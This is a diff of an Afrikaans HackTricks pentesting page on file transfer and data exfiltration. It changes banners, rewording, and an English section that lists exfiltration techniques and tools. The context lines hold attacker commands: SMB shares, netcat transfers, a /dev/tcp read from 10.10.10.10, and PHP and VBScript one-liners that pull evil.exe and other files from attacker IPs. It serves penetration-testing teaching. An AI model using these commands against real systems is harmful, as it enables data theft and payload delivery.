@@ -1,20 +1,21 @@
 # Uitlekking
 
+{% hint style="success" %}
+Leer & oefen AWS Hack:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hack: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Ondersteun HackTricks</summary>
 
-Ander maniere om HackTricks te ondersteun:
-
-* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
-* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* Controleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
 </details>
+{% endhint %}
 
-**Try Hard Security Group**
+**Probeer Hard Security Groep**
 
 <figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
@@ -170,7 +171,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Of skep 'n smb-deel **met behulp van samba**:
+Of skep 'n smb-aandeel **met behulp van samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -187,15 +188,35 @@ service smbd restart
 ```
 ### Exfiltration
 
-Exfiltration is the unauthorized transfer of data from a target system. Once an attacker gains access to a system, they need to find a way to exfiltrate the data they are after. There are various methods to exfiltrate data from a compromised system, including:
+#### Exfiltration Techniques
 
-- **Email**: Attackers can send sensitive data as email attachments to external email accounts.
-- **FTP**: File Transfer Protocol can be used to transfer files from the compromised system to an external server controlled by the attacker.
-- **DNS**: Attackers can encode sensitive data into DNS queries and exfiltrate it through DNS requests.
-- **Web**: Data can be exfiltrated by encoding it into web requests or by uploading it to a web server.
-- **Cloud Storage**: Attackers can use cloud storage services to store and exfiltrate data from the compromised system.
+Exfiltration techniques are ways to **steal** data from a target system. These techniques can be **categorized** into several groups based on how the data is **transferred** from the target system to the attacker's system. Some common exfiltration techniques include:
 
-It is essential for organizations to monitor and control outbound network traffic to detect and prevent data exfiltration attempts.
+- **Exfiltration Over Command and Control (C2) Channel**: Attackers can use a C2 channel to **send** data from the target system to their **command and control server**. This can be done using various **protocols** such as HTTP, DNS, or custom protocols.
+
+- **Exfiltration Over Alternative Protocols**: Attackers can use **alternative protocols** such as ICMP, SSH, or even social media platforms to **exfiltrate** data from the target system. This can help **bypass** **network** **security** controls that **monitor** traditional **network** traffic.
+
+- **Exfiltration Over Encrypted Channels**: Attackers can use **encrypted channels** such as **SSL/TLS** to **hide** exfiltrated data **within** **legitimate** **network** traffic. This can **evade** detection by **security** **tools** that do not **inspect** encrypted traffic.
+
+- **Exfiltration Using Steganography**: Attackers can **embed** **data** **within** **files**, **images**, or other **media** using **steganography** techniques. This **hidden** data can then be **extracted** by the attacker **without** arousing suspicion.
+
+- **Exfiltration Over DNS**: Attackers can **abuse** the **DNS** protocol to **exfiltrate** data by **encoding** it **within** **DNS** **queries** or **responses**. This can **bypass** **firewalls** that **allow** **DNS** traffic **outbound**.
+
+#### Exfiltration Tools
+
+There are several tools available to **facilitate** data exfiltration during a **penetration test**. These tools can **automate** the exfiltration process and **help** **testers** **determine** the **effectiveness** of **security** controls **implemented** by the target organization. Some common exfiltration tools include:
+
+- **Cobalt Strike**: A **popular** **framework** for **adversary** **simulations** and **red team** operations that **includes** **features** for **exfiltration**.
+
+- **Empire**: An **open-source** **post-exploitation** **framework** that **includes** **modules** for **data exfiltration**.
+
+- **PowerShell Empire**: A **post-exploitation** **framework** that **leverages** **PowerShell** for **exfiltration** and **persistence**.
+
+- **Sliver**: A **cross-platform** **implant** that **includes** **features** for **exfiltration** and **persistence**.
+
+- **SILENTTRINITY**: An **open-source** **post-exploitation** **framework** that **supports** **exfiltration** **capabilities**.
+
+By **leveraging** these tools and techniques, **attackers** can **successfully** **exfiltrate** data from **target** systems **without** being **detected**.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -211,7 +232,7 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Indien die slagoffer SSH het, kan die aanvaller 'n gids van die slagoffer na die aanvaller koppel.
+Indien die slagoffer SSH het, kan die aanvaller 'n gids van die slagoffer na die aanvaller se stelsel koppel.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -219,9 +240,7 @@ sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP addre
 ```
 ## NC
 
-### Netcat
-
-Netcat is a versatile networking utility that can be used for reading from and writing to network connections using TCP or UDP. It can be used to transfer files, port scanning, banner grabbing, and as a backdoor. Netcat can be used as a simple chat client as well.
+Netcat is 'n kragtige netwerk hulpmiddel wat gebruik kan word vir die oordrag van data oor netwerke. Dit kan gebruik word vir die skep van terugvoerlêers, portskandering, en selfs as 'n eenvoudige webbediener.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -240,7 +259,7 @@ nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-Dankie aan **@BinaryShadow\_**
+dankie aan **@BinaryShadow\_**
 
 ## **ICMP**
 ```bash
@@ -293,8 +312,6 @@ Laai 'n lêer af met 'n PHP eenlynstuk:
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
 ## VBScript
-
-VBScript is 'n skripsie taal wat deur Microsoft ontwikkel is en dikwels gebruik word vir Windows-gebaseerde skripsies en automatiseringstake. VBScript kan gebruik word vir die uitvoer van data exfiltration deur die gebruik van HTTP-aanvrae na 'n eksterne bediener. Hierdie tegniek kan gebruik word om gesteelde data van 'n geteikenrekenaar na 'n aanvaller se bediener te stuur.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -332,13 +349,12 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Die `debug.exe` program maak dit nie net moontlik om binêre lêers te inspekteer nie, maar het ook die **vermoë om hulle vanaf heks te herbou**. Dit beteken dat deur 'n heks van 'n binêre lêer te voorsien, `debug.exe` die binêre lêer kan genereer. Dit is egter belangrik om daarop te let dat debug.exe 'n **beperking het om lêers tot 64 kb in grootte saam te stel**.
+Die `debug.exe` program bied nie net die vermoë om binêre lêers te inspekteer nie, maar het ook die **vermoë om hulle vanaf heks te herbou**. Dit beteken dat deur 'n heks van 'n binêre lêer te voorsien, kan `debug.exe` die binêre lêer genereer. Dit is egter belangrik om daarop te let dat debug.exe 'n **beperking het om lêers tot 64 kb in grootte saam te stel**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-```markdown
 Dan kopieer en plak die teks in die Windows-skootrekenaar en 'n lêer genaamd nc.exe sal geskep word.
 
 * [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
@@ -353,17 +369,17 @@ Dan kopieer en plak die teks in die Windows-skootrekenaar en 'n lêer genaamd nc
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
+{% hint style="success" %}
+Leer & oefen AWS-hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP-hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Ondersteun HackTricks</summary>
 
-Ander maniere om HackTricks te ondersteun:
-
-* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
-* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
 </details>
-```
+{% endhint %}
